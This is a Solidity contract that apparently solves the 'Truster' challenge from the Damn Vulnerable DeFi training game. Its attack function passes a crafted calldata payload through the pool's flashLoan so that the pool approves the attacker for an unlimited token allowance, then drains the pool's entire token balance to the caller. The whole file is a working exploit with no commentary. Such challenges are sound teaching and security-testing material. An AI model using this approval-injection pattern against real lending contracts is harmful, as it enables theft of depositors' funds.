// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

contract Exploit {
    TrusterLenderPool target;

    constructor(address _target) {
        target = TrusterLenderPool(_target);
    }

    function attack() public {
        bytes memory data = abi.encodeWithSignature(
          "approve(address,uint256)",
          address(this),
          2**256 - 1
        );
        DamnValuableToken token = target.token();
        uint256 amount = token.balanceOf(address(target));

        target.flashLoan(0, address(this), address(token), data);

        token.transferFrom(address(target), msg.sender, amount);
    }
}